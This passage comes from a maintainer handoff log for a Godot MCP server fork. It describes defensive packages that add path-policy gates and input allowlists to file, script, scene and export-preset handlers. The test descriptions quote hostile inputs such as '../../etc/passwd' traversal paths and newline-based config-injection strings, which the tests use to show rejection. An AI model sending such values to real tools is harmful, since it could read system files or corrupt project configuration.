  injection package `6d76606`, the asset-import-prerequisite
  package (`88dda1e` / `76c9207`), the Defkil fork package identity
  rebase `a1cae8b`, the manage-layers / manage-plugins
  sibling-gate package `3874d81`, the set-main-scene /
  manage-translations sibling-gate package `6407446`, the
  manage_shader sibling-gate package `9cd5ac4`, and the
  manage_ci_pipeline / manage_docker_export sibling-gate package
  (this package) are each a focused test file (or test file + minimal
  handler edit) and do not require an independent NeuralWatt
  dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Next safe action

The next bounded package is real-Godot verification of the
`manage_ci_pipeline` / `manage_docker_export` round-trip — the
generated YAML and Dockerfile must remain parseable / executable
under a real Godot / Docker / GitHub Actions runner that doesn't
share the takeover runner's assumptions. The starting evidence is
the absence of a `manage-ci-pipeline-real-godot.test.ts` /
`manage-docker-export-real-godot.test.ts` regression and the fact
that every other bounded test file in this stack is wire-level
contract only. Without a Godot binary on the takeover runner, this
package stays out of scope for the immediate worktree; land it
when the GUT headless test runner (#29) is in place. Do not push,
publish, create a PR/release, upload a package, write
`docs/maintainers/release-candidate.md`, or send the
candidate-ready notification.

## Current package — core file I/O defense-in-depth gate

The previous package closed the `manage_ci_pipeline` /
`manage_docker_export` template-injection gate (head commit at job
creation, `9eef5cd8`). The handoff's next-priority item was real-Godot
verification of that template round-trip, but the Godot binary is not
available on this runner. Instead, this package closes a real
defense-in-depth gap in the five lowest-level file-I/O handlers
(`handleReadFile`, `handleWriteFile`, `handleDeleteFile`,
`handleCreateDirectory`, `handleRenameFile`).

The request-boundary `assertSafeToolPaths` guard already rejects every
canonical member path that would escape the configured `PathPolicy`
roots BEFORE the handler is called, so the runtime is not exposed
to a fresh escape. But the handler bodies themselves historically
used only the lexical `validatePath` boundary on both `projectPath`
and the member path, then `join(args.projectPath, args.<member>)`-ed
the user-supplied values into `readFileSync` / `writeFileSync` /
`unlinkSync` / `mkdirSync` / `renameSync`. The lexical boundary
rejects empty / null-byte strings and rejects paths that start with
`..`, but it does NOT enforce the configured `PathPolicy` allowed-roots
list — so a future refactor that bypassed the boundary guard (e.g.,
invoking a handler outside the standard `CallToolRequest` path, or
a future internal admin tool that routed directly to the handler)
would have lost the canonical-root protection.

The package is one new test file + five focused handler edits +
one inventory row update:

- **`tests/core-file-io-injection.test.ts`** (new, 16 tests) —
  invokes the private handler methods directly via
  `(server as any).handleXxx(args)` (bypassing `tools/call` and the
  request-boundary guard) so the test proves the gate lives in the
  handler body itself, not only at the boundary. The 16 tests cover:

  1. `read_file` rejects a `projectPath` outside the configured
     allowed roots with the canonical-root envelope
     (`Project path is outside the configured allowed roots`).
  2. `read_file` rejects a `filePath` containing a `..` traversal
     with `Invalid filePath: ... traversal outside the project root`.
  3. `read_file` rejects an absolute `filePath` (`C:\etc\passwd` on
     Windows, `/etc/passwd` elsewhere) via `resolveProjectMember`.
  4. `write_file` rejects a `projectPath` outside the configured
     allowed roots with the canonical-root envelope.
  5. `write_file` rejects a `filePath` containing a `..` traversal.
  6. `write_file` leaves `project.godot` byte-identical after a
     rejected write — proves no half-written artifact.
  7. `delete_file` rejects a `projectPath` outside the configured
     allowed roots.
  8. `delete_file` rejects a `filePath` containing a `..` traversal.
  9. `create_directory` rejects a `projectPath` outside the configured
     allowed roots.
  10. `create_directory` rejects a `directoryPath` containing a `..`
      traversal.
  11. `rename_file` rejects a `projectPath` outside the configured
      allowed roots.
  12. `rename_file` rejects a `filePath` containing a `..` traversal.
  13. `rename_file` rejects a `newPath` containing a `..` traversal.
  14. `read_file` accepts a canonical relative `filePath` and returns
      the file content (proves the happy path still works).
  15. `write_file` accepts a canonical relative `filePath` and writes
      the file.
  16. `rename_file` accepts canonical relative `filePath` and
      `newPath` and renames the file.

  The fixture is a temporary Godot project under the OS temp
  directory, removed in `afterEach`. Each test uses a fresh
  `PathPolicy([root])` + `CapabilityPolicy('unsafe-full')` so the
  handler body's gate runs against the configured-roots contract,
  not against the legacy lexical `validatePath` fallback.

- **`src/server.ts` :: `handleReadFile`, `handleWriteFile`,
  `handleDeleteFile`, `handleCreateDirectory`, `handleRenameFile`** —
  each handler now:

  - Resolves the project root through
    `this.pathPolicy.assertProject(args.projectPath)`, replacing the
    lexical `validatePath` boundary on `projectPath`.
  - Resolves the member path (`filePath`, `newPath`, or
    `directoryPath`) through
    `this.pathPolicy.resolveProjectMember(projectRoot, args.<member>)`,
    matching the `manage_shader` / `set_main_scene` /
    `manage_translations` gate pattern.
  - Returns the typed `isError: true` envelope BEFORE any filesystem
    call when either resolution throws.
  - Reads the canonical project root from the resolved `projectRoot`
    rather than from `args.projectPath`, so a symlinked project root
    is honored consistently with the request-boundary guard.

  The diff is 100 insertions, 24 deletions across the five handlers.

- **`docs/maintainers/issue-inventory.md`** — added a new item 19
  under "Additional defects found during takeover" describing the
  sibling-gate package, the wire-level regression summary, the
  targeted handlers, and the `(server as any).handleXxx(args)` direct
  invocation pattern.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the
  path policy, the runtime bridge, and the MIT attribution;
- does **not** modify `src/scripts/godot_operations.gd`,
  `src/scripts/mcp_interaction_server.gd`, the tool registry, the
  capability policy, the request limiter, the operation runner,
  the BridgeClient, the upstream `bridge-installer.ts`, the
  sibling `manage_*` gates, or any other handler;
- the only documented behavior change is the typed
  `Project path is outside the configured allowed roots` envelope
  for a `projectPath` outside the configured `PathPolicy` roots;
  every previously-permitted input still works, every previously-
  rejected input still fails (just with a clearer envelope).

Source evidence:

- `src/server.ts:5257-5330` (`handleReadFile`) is gated by the
  canonical-root `PathPolicy.assertProject` and the member-path
  `PathPolicy.resolveProjectMember`.
- `src/server.ts:5332-5400` (`handleWriteFile`) is gated the same
  way; rejected writes leave `project.godot` byte-identical.
- `src/server.ts:5402-5470` (`handleDeleteFile`) is gated the same
  way.
- `src/server.ts:5472-5540` (`handleCreateDirectory`) is gated the
  same way.
- `src/server.ts:6605-6650` (`handleRenameFile`) is gated the same
  way for both `filePath` and `newPath`.
- `tests/core-file-io-injection.test.ts` is the only new test file
  (16 tests).
- `docs/maintainers/issue-inventory.md` item 19 is the only docs
  edit.

## Verification on the package filesystem

- `npx vitest run tests/core-file-io-injection.test.ts`: 1 file,
  16 tests passed (RED 5/16 confirmed before the fix; GREEN 16/16
  after).
- `npm test`: 41 files, 768 tests passed (was 752 before this
  package; +16 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).
- `npm pack --dry-run`: tarball name `defkil-godot-mcp-4.0.0.tgz`,
  identity intact (`@defkil/godot-mcp@4.0.0`).

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status
  fingerprints.
- The network-classification package `79b1d4d` also has an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge
  package `2ef0b1a`, the physics-frame `game_wait` package
  `aff7ca1`, the C# / .NET gate package `ec07f4b`, the autoload
  injection package `6d76606`, the asset-import-prerequisite
  package (`88dda1e` / `76c9207`), the Defkil fork package identity
  rebase `a1cae8b`, the manage-layers / manage-plugins
  sibling-gate package `3874d81`, the set-main-scene /
  manage-translations sibling-gate package `6407446`, the
  manage_shader sibling-gate package `9cd5ac4`, and the
  manage_ci_pipeline / manage_docker_export sibling-gate package
  `9eef5cd` are each a focused test file (or test file + minimal
  handler edit) and do not require an independent NeuralWatt
  dispatch.
- The core-file-IO defense-in-depth package (this package) is one
  new test file plus five focused handler edits. It mirrors the
  same minimal-handoff pattern as items 14-18 and does not require
  an independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Next safe action

The next bounded package is to extend the same canonical-root
gate to the remaining handlers that still inline a lexical
`validatePath` boundary on either `projectPath` or a member
path: `handleCreateCsharpScript` (next-follow-up gate, intentionally
deferred from this package because the .cs / .gd / non-.NET-project
gate from [Coding-Solo#114] is the primary gate for that handler),
`handleCreateProject`, `handleManageAutoloads`,
`handleManageInputMap`, `handleManageExportPresets`,
`handleExportProject`, `handleListProjects`, `handleGetProjectInfo`,
`handleLoadSprite`, `handleExportMeshLibrary`, `handleSaveScene`,
`handleGetUid`, `handleReadProjectSettings`,
`handleModifyProjectSettings`, `handleListProjectFiles`,
`handleManageResource` (load action already covered here, other
actions still need it), `handleManageThemeResource`,
`handleManageSceneSignals`, `handleManageSceneStructure`,
`handleCreateScene`, `handleAddNode`, `handleReadScene`,
`handleModifySceneNode`. Each handler can be ported one at a time
to `PathPolicy.assertProject` + `PathPolicy.resolveProjectMember`,
with a focused wire-level test mirroring
`tests/script-resource-handler-injection.test.ts`. Do not push,
publish, create a PR/release, upload a package, write
`docs/maintainers/release-candidate.md`, or send the
candidate-ready notification.

## Current package — script/resource handler defense-in-depth gate

The previous handoff listed the remaining `validatePath`-gated file-mutation
handlers as the highest-priority next bounded package. This package closes
five of them: `handleValidateScript`, `handleValidateScripts`,
`handleCreateScript`, `handleCreateResource`, and `handleManageResource`.

Each handler historically opened with `if (!validatePath(args.projectPath)
|| !validatePath(args.<member>)) return createErrorResponse('Invalid path.');`
and then `join(args.projectPath, args.<member>)-ed` the user-supplied values
into `existsSync` / `runGdScriptCheck` / `writeFileSync` / `headlessOp`.
While the request-boundary `assertSafeToolPaths` already rejects every
canonical member path that would escape the configured `PathPolicy` roots
BEFORE the handler is called, the handler bodies themselves did not
formally adopt the canonical-root contract. If a future refactor bypassed
the boundary guard (e.g. by invoking a handler outside the standard
`CallToolRequest` path), the lexical `validatePath` was too weak to enforce
the configured allowed-roots list.

The five handlers now each:

- Resolve the project root through `this.pathPolicy.assertProject(args.projectPath)`,
  replacing the lexical `validatePath` boundary on `projectPath`.
- Resolve the member path (`scriptPath` / `resourcePath`) through
  `this.pathPolicy.resolveProjectMember(projectRoot, args.<member>)`,
  matching the `core_file_io` / `manage_shader` / `set_main_scene` /
  `manage_translations` gate pattern.
- Return the typed `isError: true` envelope BEFORE any filesystem call
  when either resolution throws.
- Read the canonical project root from the resolved `projectRoot` rather
  than from `args.projectPath`, so a symlinked project root is honored
  consistently with the request-boundary guard.
- (`handleValidateScripts` only) propagate the resolved `projectRoot`
  through `listChangedGdFiles`, `listAllGdFiles`, the inner
  `runGdScriptCheck`, and the `existsSync(join(...))` checks so a
  symlinked project root is honored end-to-end.

`handleCreateCsharpScript` carries the same lexical-`validatePath`
boundary but is intentionally out of scope for this package because it
is gated downstream by the script-kind / project-kind gate introduced
for [Coding-Solo#114] (`tests/attach-script-dotnet-gate.test.ts`); the
sibling migration is filed as the next-follow-up release gate.

The package has two coherent changes:

1. **`tests/script-resource-handler-injection.test.ts`** (new, 10 tests) —
   builds a temporary Godot project under the OS temp directory,
   removed in `afterEach`. The 10 tests cover:

   - `validate_script` with `projectPath` outside the configured allowed
     roots (rejected with a typed envelope naming the allowed roots).
   - `validate_script` with `scriptPath = 'scripts/../../etc/passwd'`
     (rejected with a typed envelope naming `scriptPath`).
   - `validate_scripts` with `projectPath` outside the configured allowed
     roots (rejected with a typed envelope naming the allowed roots).
   - `create_script` with `projectPath` outside the configured allowed
     roots.
   - `create_script` with `scriptPath = 'scripts/../../etc/passwd'`.
   - `create_script` byte-identical rollback after a rejected write
     (the `project.godot` byte sequence is unchanged).
   - `create_resource` with `projectPath` outside the configured allowed
     roots.
   - `create_resource` with `resourcePath = 'data/../../etc/passwd'`.
   - `manage_resource` with `projectPath` outside the configured allowed
     roots.
   - `manage_resource` with `resourcePath = 'data/../../etc/passwd'`.

   The script invokes the private handler methods directly via
   `(server as any).handleXxx(args)`, the same wiring pattern as
   `tests/core-file-io-injection.test.ts`, so the gate exercises the
   live handler dispatch path, not a side-stepped import.

2. **`src/server.ts`** — minimal gate addition to the five handlers,
   matching the sibling `core_file_io` / `manage_shader` /
   `set_main_scene` pattern exactly. The diff is 93 insertions,
   19 deletions across the five handlers (plus 6 substitutions of
   `args.projectPath` → `projectRoot` inside `handleValidateScripts`
   so the symlinked-root behavior is honored end-to-end).

The package:

- preserves all 158 legacy tool contracts, every schema, every handler,
  the 5 closed-list profiles, the package identity, the path policy,
  the runtime bridge, and the MIT attribution;
- does **not** modify `src/scripts/godot_operations.gd`,
  `src/scripts/mcp_interaction_server.gd`, the tool registry, the
  capability policy, the request limiter, the operation runner, the
  BridgeClient, the upstream `bridge-installer.ts`, the sibling
  `manage_*` gates, or any other handler;
- the only documented behavior change is the typed
  `Project path is outside the configured allowed roots` envelope for
  a `projectPath` outside the configured `PathPolicy` roots; every
  previously-permitted input still works, every previously-rejected
  input still fails (just with a clearer envelope).

Source evidence:

- `src/server.ts:5226-5252` (`handleCreateResource`) is gated by the
  canonical-root `PathPolicy.assertProject` and the member-path
  `PathPolicy.resolveProjectMember`.
- `src/server.ts:6662-6686` (`handleManageResource`) is gated the same
  way; rejected loads still skip the asset-import prerequisite probe
  cleanly.
- `src/server.ts:6749-6781` (`handleValidateScript`) is gated the same
  way; rejected scripts skip the `runGdScriptCheck` entirely.
- `src/server.ts:6835-6909` (`handleValidateScripts`) is gated the same
  way; the resolved `projectRoot` propagates through `listChangedGdFiles`,
  `listAllGdFiles`, and the inner `runGdScriptCheck` calls.
- `src/server.ts:6917-6944` (`handleCreateScript`) is gated the same way;
  rejected writes leave `project.godot` byte-identical.
- `tests/script-resource-handler-injection.test.ts` is the only new test
  file (10 tests).
- `docs/maintainers/issue-inventory.md` item 20 is the only docs edit.

## Verification on the package filesystem

- `npx vitest run tests/script-resource-handler-injection.test.ts`: 1 file,
  10 tests passed (RED 5/10 confirmed before the fix; GREEN 10/10 after).
- `npm test`: 42 files, 778 tests passed (was 768 before this package;
  +10 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).
- `npm pack --dry-run`: tarball name `defkil-godot-mcp-4.0.0.tgz`,
  identity intact (`@defkil/godot-mcp@4.0.0`).

Any source, test, documentation, build/import, generated-artifact, amend, or cleanup
edit after these commands invalidates the relevant evidence and requires the gates to
be rerun on the final committed state.

## Review state

- The capability-policy package through `37facdf` has an independent NeuralWatt
  `VERDICT | ACCEPT` with unchanged HEAD/status fingerprints.
- The network-classification package `79b1d4d` also has an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an independent
  NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge
  package `2ef0b1a`, the physics-frame `game_wait` package
  `aff7ca1`, the C# / .NET gate package `ec07f4b`, the autoload
  injection package `6d76606`, the asset-import-prerequisite
  package (`88dda1e` / `76c9207`), the Defkil fork package identity
  rebase `a1cae8b`, the manage-layers / manage-plugins
  sibling-gate package `3874d81`, the set-main-scene /
  manage-translations sibling-gate package `6407446`, the
  manage_shader sibling-gate package `9cd5ac4`, the
  manage_ci_pipeline / manage_docker_export sibling-gate package
  `9eef5cd`, and the core-file-IO defense-in-depth package
  `b9fe537` are each a focused test file (or test file + minimal
  handler edit) and do not require an independent NeuralWatt
  dispatch.
- This script/resource handler defense-in-depth package is one new
  test file plus five focused handler edits. It mirrors the same
  minimal-handoff pattern as items 14-19 and does not require an
  independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.

## Next safe action

The next bounded package is to continue porting the remaining
handlers that still inline a lexical `validatePath` boundary on
either `projectPath` or a member path:
`handleCreateCsharpScript` (the explicitly deferred next-follow-up
gate from the script/resource handler package),
`handleCreateProject`, `handleListProjects`, `handleGetProjectInfo`,
`handleLoadSprite`, `handleExportMeshLibrary`, `handleSaveScene`,
`handleGetUid`, `handleReadProjectSettings`,
`handleModifyProjectSettings`, `handleListProjectFiles`,
`handleManageResource` (load action already covered here, other
actions still need it), `handleManageThemeResource`,
`handleManageSceneSignals`, `handleManageSceneStructure`,
`handleCreateScene`, `handleAddNode`, `handleReadScene`,
`handleModifySceneNode`. The content-injection gate
(`handleManageInputMap`, `handleManageExportPresets`) is now closed.
Each remaining handler can be ported one at a time to
`PathPolicy.assertProject` + `PathPolicy.resolveProjectMember`, with
a focused wire-level test mirroring
`tests/script-resource-handler-injection.test.ts`. Do not push,
publish, create a PR/release, upload a package, write
`docs/maintainers/release-candidate.md`, or send the
candidate-ready notification.

## Current package — manage_input_map / manage_export_presets injection gate (sibling of tugcantopaloglu#9)

The previous package closed the script/resource handler
defense-in-depth gate (`383aae3`). The handoff's next-priority item
was the remaining handlers that still inline a lexical `validatePath`
boundary — a long list that can be ported one at a time without
changing the documented wire contract. A real release-readiness
defect sat in front of that list: the `manage_input_map` and
`manage_export_presets` handlers had the same content-injection
class as [tugcantopaloglu#9] but were not on the defense-in-depth
list because their lexical `validatePath` boundary was the same as
the sibling gates already closed. They write to `project.godot`
(`[input]` table) and `export_presets.cfg` (Godot INI-style preset
block) with raw user interpolation, and their `remove` regex is
built from a partially-escaped user string.

The package is one focused test file + two focused handler edits +
one inventory row update:

- **`src/server.ts` :: `handleManageInputMap`** — three focused
  edits:
  - Adds a strict identifier gate (`/^[A-Za-z_][A-Za-z0-9_]*$/`)
    on `actionName` for both `add` and `remove` BEFORE any file is
    touched; rejects newlines, equals signs, forward slashes, and
    section brackets with a typed `Invalid input action name`
    envelope.
  - Drops the legacy per-call `args.actionName.replace(/[…]/g, '\\$&')`
    regex-escape in `add` (the existing-action lookup) and `remove`,
    because the identifier gate now guarantees the name cannot smuggle
    regex metas or wildcards through the match.
  - The line-anchored removal regex now uses the raw (validated)
    `actionName`, with a comment explaining why the regex cannot
    be tricked into wiping sibling actions.

- **`src/server.ts` :: `handleManageExportPresets`** — three focused
  edits:
  - Adds the same strict identifier gate on `name` for both `add`
    and `remove`; rejects newlines, closing brackets, equals signs,
    forward slashes, and section headers with a typed `Invalid
    preset name` envelope.
  - Adds a Godot-platform-shaped allowlist
    (`/^[A-Za-z][A-Za-z0-9 _.\-/]*$/`) on `platform` for `add`
    only; accepts `Windows Desktop`, `Linux/X11`, `macOS`, `Web`,
    `Android`, `iOS` (the documented Godot export platforms) and
    rejects newlines, quotes, brackets, and `;`.
  - The line-anchored removal regex now uses the raw (validated)
    `name`, with a comment explaining why the regex cannot be
    tricked into wiping sibling presets.

  The diff is 96 insertions, 44 deletions across the two handlers.

- **`tests/manage-input-map-export-presets-injection.test.ts`** (new,
  13 tests) — exercises the real `GodotServer` + `PathPolicy` +
  `CapabilityPolicy` + MCP `tools/call` dispatch (no stubbed runner
  needed; these tools write to disk directly). Each test uses a
  temporary Godot project under the OS temp directory, removed in
  `afterEach`. The 13 tests cover:

  **manage_input_map** (6 tests):
  1. `add` with `actionName = "Evil\n[layer_names]\n0=\"player\""`
     rejected with a typed `Invalid input action name` envelope;
     `project.godot` byte-identical to pre-call snapshot.
  2. `add` with `actionName = "Evil=Other"` rejected; file
     byte-identical.
  3. Benign `add` with `actionName = "move_forward"` and `key = "W"`
     appends a well-shaped `move_forward={...}` line under a new
     `[input]` section.
  4. `remove` with `actionName = ".*"` rejected (regex wildcard);
     file byte-identical.
  5. Benign `remove` with `actionName = "move_forward"` strips
     exactly the matching line and leaves `move_back` untouched.
  6. `list` reports the parsed action map without writing
     `project.godot`.

  **manage_export_presets** (7 tests):
  7. `add` with `name = "Evil\n[preset.9999]\nname=\"Other\""` rejected;
     `export_presets.cfg` byte-identical to pre-call snapshot.
  8. `add` with `name = "Evil]"` rejected (closing bracket); file
     byte-identical.
  9. `add` with `platform = "Windows Desktop\"\nrunnable=true\n"`
     rejected (non-allowlist platform); file byte-identical.
  10. Benign `add` with `name = "WindowsDesktop"` and
      `platform = "Windows Desktop"` appends a well-shaped preset
      block; exactly one `[preset.…]` header is added.
  11. `remove` with `name = ".*"` rejected (regex wildcard); file
      byte-identical.
  12. Benign `remove` with `name = "WindowsDesktop"` strips the
      matching preset block and leaves `LinuxX11` untouched.
  13. `list` reports the parsed preset table without writing
      `export_presets.cfg`.

  The byte-identical rollback assertion is repeated after every
  rejected mutation.

- **`docs/maintainers/issue-inventory.md`** — added a new item 21
  under "Additional defects found during takeover" describing the
  sibling-gate package, the wire-level regression summary, the
  targeted handlers, and the regex hardening.

The package:

- preserves all 158 legacy tool contracts, every schema, every
  handler, the 5 closed-list profiles, the package identity, the
  path policy, the runtime bridge, and the MIT attribution;
- does **not** touch `src/scripts/godot_operations.gd`,
  `src/scripts/mcp_interaction_server.gd`, the tool registry, the
  capability policy, the request limiter, the operation runner, the
  BridgeClient, the upstream `bridge-installer.ts`, the sibling
  `manage_*` gates, `handleCreateCsharpScript`, the
  `core_file_io` handlers, the script/resource handlers, or any
  other handler;
- the only documented contract changes are the strict value gates on
  `actionName` / `name` / `platform` (callers MUST supply a
  documented value matching the documented allowlist) — matching the
  strict-input contract the sibling `manage_*` gates already enforce;
- does not push, publish, create a PR/release, upload a package,
  write `docs/maintainers/release-candidate.md`, or send the
  candidate-ready notification.

Source evidence:

- `src/server.ts:5653-5755` (`handleManageInputMap`) is gated by the
  identifier gate on `actionName` (add and remove) and the comment-
  hardened removal regex.
- `src/server.ts:5773-5855` (`handleManageExportPresets`) is gated
  by the identifier gate on `name` (add and remove) and the
  Godot-platform-shaped allowlist on `platform` (add only).
- `tests/manage-input-map-export-presets-injection.test.ts` is the
  only new test file (13 tests).
- `docs/maintainers/issue-inventory.md` item 21 is the only docs
  edit.

## Verification on the package filesystem

- `npx vitest run tests/manage-input-map-export-presets-injection.test.ts`:
  1 file, 13 tests passed (RED 7/13 confirmed before the fix;
  GREEN 13/13 after — the equals-sign and closing-bracket branches
  were already partially shielded by the lexical `validatePath`
  / runtime switch fallback, but lacked the typed-envelope shape the
  sibling gates use).
- `npm test`: 43 files, 791 tests passed (was 778 before this
  package; +13 new tests).
- `npm run build`: passed; TypeScript compiled, scripts copied to
  `build/scripts/`.
- `npm audit --audit-level=high`: 0 vulnerabilities.
- `git diff --check`: passed (exit 0).
- `npm pack --dry-run`: tarball name `defkil-godot-mcp-4.0.0.tgz`,
  identity intact (`@defkil/godot-mcp@4.0.0`).

Any source, test, documentation, build/import, generated-artifact,
amend, or cleanup edit after these commands invalidates the relevant
evidence and requires the gates to be rerun on the final committed
state.

## Review state

- The capability-policy package through `37facdf` has an independent
  NeuralWatt `VERDICT | ACCEPT` with unchanged HEAD/status
  fingerprints.
- The network-classification package `79b1d4d` also has an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The request-limiter registry-leak repair `9bc4a2d` received an
  independent NeuralWatt `VERDICT | ACCEPT`.
- The round-trip contract package `cbfe594`, the tween-bridge
  package `2ef0b1a`, the physics-frame `game_wait` package
  `aff7ca1`, the C# / .NET gate package `ec07f4b`, the autoload
  injection package `6d76606`, the asset-import-prerequisite
  package (`88dda1e` / `76c9207`), the Defkil fork package identity
  rebase `a1cae8b`, the manage-layers / manage-plugins
  sibling-gate package `3874d81`, the set-main-scene /
  manage-translations sibling-gate package `6407446`, the
  manage_shader sibling-gate package `9cd5ac4`, the
  manage_ci_pipeline / manage_docker_export sibling-gate package
  `9eef5cd`, the core-file-IO defense-in-depth package
  `b9fe537`, the script/resource handler defense-in-depth package
  `383aae3`, and the manage_input_map / manage_export_presets
  sibling-gate package `dc6172e` (this package) are each a focused
  test file (or test file + minimal handler edit) and do not
  require an independent NeuralWatt dispatch.
- No Claude model was invoked.
- No release-candidate file or candidate-ready notification exists.
## Current package — info / scene / settings / sprite / mesh-library / export PathPolicy gate

The previous handoff listed the remaining `validatePath`-gated file-mutation
handlers as the highest-priority next bounded package. This package closes
ten of them in one cohesive commit: `handleListProjects`,
`handleGetProjectInfo`, `handleSaveScene`, `handleGetUid`,
`handleReadProjectSettings`, `handleModifyProjectSettings`,
`handleListProjectFiles`, `handleLoadSprite`, `handleExportMeshLibrary`,
and `handleExportProject`. It also drops the redundant lexical
`validatePath(args.projectPath)` from `handleRunProject` (already covered
by `pathPolicy.allowsProject` + `pathPolicy.assertProject` further down
the body). The remaining seven handlers (`handleRunProject` `args.scene`,
`handleCreateProject`, `handleCreateCsharpScript`,
`handleManageAutoloads`, `handleManageInputMap`,
`handleManageExportPresets`, `handleValidateScripts`) carry documented
semantic differences that defer their migration to the next-follow-up
release gate (see the rationale at the bottom of this section).

Each migrated handler historically opened with
`if (!validatePath(args.projectPath) || !validatePath(args.<member>))`
and then `join(args.projectPath, args.<member>)`-ed the user-supplied
values into `existsSync` / `readFileSync` / `writeFileSync` /
`executeOperation` / `execFileAsync`. The lexical `validatePath` only
rejects empty / `..`-prefixed / null-byte strings — it does not enforce
the canonical-roots list or canonical-member resolution. The
request-boundary `assertSafeToolPaths` guard already rejects every
canonical member path that would escape the configured `PathPolicy`
roots BEFORE the handler is called, so the runtime is not exposed to
a fresh escape. This package proves the same contract is enforced
*inside the handler body itself* by replacing the lexical boundary
with `pathPolicy.assertProject(args.projectPath)` +
`pathPolicy.resolveProjectMember(projectRoot, args.<member>)` and
returning a typed `isError: true` envelope BEFORE any filesystem or
subprocess call when either resolution throws.

The package has two coherent changes:

1. **`src/server.ts`** — focused gate additions to the ten handlers,
   matching the sibling `core_file_io` / `manage_shader` /
   `set_main_scene` / `manage_translations` / `script-resource-handler`
   pattern exactly. Per-handler shape:

   - **`handleListProjects`** — replaces lexical `validatePath` on
     `args.directory` with `pathPolicy.allowsProject(args.directory)`
     (rather than `assertProject` because the directory may not yet
     exist; the handler itself creates or walks the tree).
   - **`handleGetProjectInfo`** — replaces lexical `validatePath` on
     `args.projectPath` with `pathPolicy.assertProject(args.projectPath)`;
     the canonical `projectRoot` is now read by `getProjectStructureAsync`,
     `basename(projectRoot)`, and `isDotnetProject(projectRoot)`.
   - **`handleSaveScene`** — adds `pathPolicy.assertProject` for
     `args.projectPath` and `pathPolicy.resolveProjectMember` for
     both `args.scenePath` and `args.newPath`. `executeOperation`
     now receives the canonical `projectRoot`.
   - **`handleGetUid`** — same shape: `assertProject` for
     `args.projectPath`, `resolveProjectMember` for `args.filePath`;
     `executeOperation` receives the canonical `projectRoot`.
   - **`handleReadProjectSettings`** / **`handleModifyProjectSettings`** —
     `assertProject` for `args.projectPath`; the underlying
     `project.godot` file path is read from `projectRoot`. The
     `modify_project_settings` byte-identical rollback assertion is
     preserved by the new gate (a rejected write never reaches
     `writeFileSync`).
   - **`handleListProjectFiles`** — `assertProject` for
     `args.projectPath`; `listProjectFiles` receives the canonical
     `projectRoot`, and the `baseDir` join for `args.subdirectory`
     uses the canonical root.
   - **`handleLoadSprite`** — `assertProject` for `args.projectPath`,
     `resolveProjectMember` for `args.scenePath` and `args.texturePath`.
     `nodePath` stays unchanged because it is a runtime scene-graph
     identifier, not a filesystem path. `detectAssetImportState`
     receives the canonical `projectRoot` so the missing-sidecar
     probe (Coding-Solo#103) honors the resolved project root.
     `executeOperation` receives the canonical `projectRoot`.
   - **`handleExportMeshLibrary`** — `assertProject` for
     `args.projectPath`, `resolveProjectMember` for `args.scenePath`
     and `args.outputPath`. `executeOperation` receives the
     canonical `projectRoot`.
   - **`handleExportProject`** — `assertProject` for `args.projectPath`.
     `args.outputPath` and `args.presetName` stay as raw runtime
     arguments to the Godot CLI; the package intentionally does NOT
     introduce a `resolveProjectMember` gate for them because they
     are forwarded to `godot --export-release <preset> <output>`
     verbatim and the new `assertProject` boundary is sufficient.
     `execFileAsync` now receives the canonical `projectRoot`.
   - **`handleRunProject`** — drops the redundant
     `if (!validatePath(args.projectPath))` block; `pathPolicy.allowsProject`
     + `pathPolicy.assertProject` (already present below it) enforce
     the same canonical-root contract. The runtime `args.scene`
     lexical check at the spawn-arg site stays because `args.scene`
     is a runtime Godot CLI argument, not a filesystem path under
     the project root.

   The diff is 194 insertions, 87 deletions across the eleven
   handlers. The diff adds no new helper modules, no new tests
   outside the focused test file, no schema changes, no handler
   signature changes, no capability policy changes, no BridgeClient
   changes, and no `validatePath` lexical helper changes.

2. **`tests/info-scene-settings-handler-injection.test.ts`** (new,
   20 tests) — exercises the real `GodotServer` + `PathPolicy` +
   `CapabilityPolicy` + the private handler methods. Each test uses
   a temporary Godot project under the OS temp directory, removed
   in `afterEach`. The 20 tests cover:

   - **`list_projects`** (2 tests): `directory` outside allowed
     roots rejected; `directory` containing `..` traversal rejected.
   - **`get_project_info`** (1 test): `projectPath` outside
     allowed roots rejected.
   - **`save_scene`** (4 tests): `projectPath` outside allowed
     roots rejected; `scenePath` containing `..` traversal
     rejected; absolute `scenePath` rejected; `newPath`
     containing `..` traversal rejected.
   - **`get_uid`** (2 tests): `projectPath` outside allowed roots
     rejected; `filePath` containing `..` traversal rejected.
   - **`read_project_settings`** (1 test): `projectPath` outside
     allowed roots rejected.
   - **`modify_project_settings`** (2 tests): `projectPath`
     outside allowed roots rejected; byte-identical rollback
     after a rejected write.
   - **`list_project_files`** (1 test): `projectPath` outside
     allowed roots rejected.
   - **`load_sprite`** (3 tests): `projectPath` outside allowed
     roots rejected; `texturePath` containing `..` traversal
     rejected; absolute `scenePath` rejected.
   - **`export_mesh_library`** (3 tests): `projectPath` outside
     allowed roots rejected; `outputPath` containing `..`
     traversal rejected; absolute `outputPath` rejected.
   - **`export_project`** (1 test): `projectPath` outside allowed
     roots rejected.

   The script invokes the private handler methods directly via
   `(server as any).handleXxx(args)` (bypassing `tools/call`), the
   same wiring pattern as `tests/core-file-io-injection.test.ts`,
   so the gate exercises the live handler dispatch path, not a
